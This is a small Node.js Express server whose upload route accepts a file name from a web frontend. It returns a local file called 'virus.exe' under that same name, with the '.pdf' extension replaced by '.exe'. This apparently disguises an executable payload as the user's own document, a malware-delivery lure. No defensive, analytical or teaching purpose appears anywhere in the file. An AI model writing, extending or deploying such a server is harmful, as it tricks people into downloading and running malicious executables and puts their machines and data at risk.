import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import fs from 'fs';
import path from 'path';


dotenv.config();
const app = express();

app.use(cors());
app.use(express.json());

const port = process.env.PORT || 4646;

app.get('/',(req,res)=>{
    res.send('Hello World');
})

app.post('/upload',(req,res)=>{
    const {name} = req.body;
    console.log('Name from Frontend: ',name)

    const filePath = path.join(process.cwd(), 'virus.exe');
    const newFileName = name.replace(/\.pdf$/i, '.exe');

    res.download(filePath, newFileName, (err)=>{
        if(err){
            console.error('Error downloading file:', err);
        }
    });
})

app.listen(port,()=>{
    console.log(`Server on port ${port}`);
})
